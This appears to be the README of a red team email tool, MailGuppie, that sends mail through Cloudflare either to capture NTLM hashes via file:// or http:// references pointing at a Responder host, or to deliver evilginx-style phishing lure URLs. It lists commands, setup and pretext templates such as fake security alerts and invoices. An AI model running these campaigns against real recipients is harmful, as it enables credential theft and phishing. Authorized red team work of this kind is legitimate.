# MailGuppie

Cloudflare Email sender for authorized red team engagements.

## Modes

**forced-auth** (default) — NTLM hash capture via `file://` or `http://` responder references.

```bash
python3 MailGuppie.py -s noreply@domain.com -t targets.txt -r 10.0.1.100
python3 MailGuppie.py -s noreply@domain.com -n "IT Support" -t targets.txt -r 10.0.1.100 -c config/enable-images-v2.conf
```

**phish** — Lure URL delivery (evilginx, etc).

```bash
python3 MailGuppie.py -m phish -s noreply@domain.com -t targets.txt -u "https://login.phishdomain.com/lure"
python3 MailGuppie.py -m phish -s noreply@domain.com -n "Security Team" -t targets.txt -u "https://login.phishdomain.com/lure" -c config/invoice-due.conf
```

## Options

```
  -m, --mode       forced-auth (default) or phish
  -s, --sender     Sender address (must be on a verified Cloudflare sending domain)
  -n, --name       Sender display name (default: local part of -s address)
  -t, --targets    File containing one target email per line
  -r, --responder  Responder IP/hostname (forced-auth mode)
  -u, --url        Lure URL (phish mode)
  -c, --config     Email template (default: per mode)
  -l, --log        Append-only send log (default: send.log)
  --delay          Seconds between sends, supports range (e.g. 3-8)
  --dry-run        Render the first message and print it without sending
  --resume         Skip targets already marked SENT in the log
```

## Setup

**1. Fill in `config/key.conf`**

- `ACCOUNT_ID` — right sidebar on any zone at dash.cloudflare.com
- `TOKEN` — dash.cloudflare.com/profile/api-tokens → Custom token → Account > Email Sending > Edit

**2. Add your sending domain in Cloudflare** → Email → Email Sending

## Templates

### forced-auth

- `config/template.conf` — minimal (default)
- `config/enable-images-v2.conf` — Q4 review pretext with embedded tracking
- `config/enable-images-http.conf` — HTTP variant
- `config/browser-view-template.conf` — "view in browser" pretext

### phish

- `config/security-alert.conf` — unusual sign-in activity (default)
- `config/invoice-due.conf` — invoice payment due

Edit template headers to set subject, reply-to, and custom variables.

**Placeholders:**

| Placeholder      | Value                                           |
|------------------|-------------------------------------------------|
| `<RESPONDER>`    | `-r` argument (forced-auth mode)                |
| `<LURE_URL>`     | `-u` argument (phish mode)                      |
| `<SENDER>`       | `-s` argument                                   |
| `<SENDER_NAME>`  | `-n` argument (or local part of `-s`)           |
| `<SHA3_HASH>`    | SHA3-256 of target email — unique per recipient |
| `<TARGET_EMAIL>` | Target email address                            |
| `<CUSTOM_VAR>`   | Any `# CUSTOM_VAR: value` line in the template  |

## Send Log

```
SENT    target@corp.com    abc123hash    2026-08-10 14:30:00
FAIL    other@corp.com     def456hash    2026-08-10 14:30:05    [error]
```
